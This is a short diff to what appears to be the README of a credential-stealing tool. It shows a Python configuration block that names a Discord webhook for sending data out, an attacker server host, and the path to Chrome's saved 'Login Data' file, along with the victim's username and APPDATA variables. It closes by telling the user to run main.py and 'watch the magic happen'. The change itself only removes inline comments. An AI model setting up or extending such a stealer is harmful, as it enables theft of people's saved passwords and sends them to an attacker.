@@ -22,14 +22,14 @@ PHP file. Once you have your local server setup, make sure to configure everythi
 
 - Example
 ```python
-WEBHOOK 	    = 	'https://discord.com/webhooks/idontfuckingknow' 									      # Discord webhook URL
-REDIRECT 	    = 	'' 									                                                    # Optional redirect to website
-HOST	 	      = 	'http://mydomain.org/' 									                                # Server host URL (e.g: http://127.0.0.1/)
-CHROME_DATA 	=	  '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'	    # Chrome login data path
-USERNAME	    =	  os.environ.get('USERNAME')						                                  # Username environment variable
-APPDATA		    =	  os.getenv('APPDATA')							                                      # Appdata environment variable
+WEBHOOK 	    = 	'https://discord.com/webhooks/idontfuckingknow'
+REDIRECT 	    = 	''
+HOST	 	    = 	'http://mydomain.org/'
+CHROME_DATA 	    =   '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
+USERNAME	    =   os.environ.get('USERNAME')
+APPDATA		    =   os.getenv('APPDATA')
 
-DEBUG 		    = 	False									                                                  # Enable or disable debugging
+DEBUG 		    = 	False
 ```
 
 After this you can execute `main.py` and watch the magic happen!
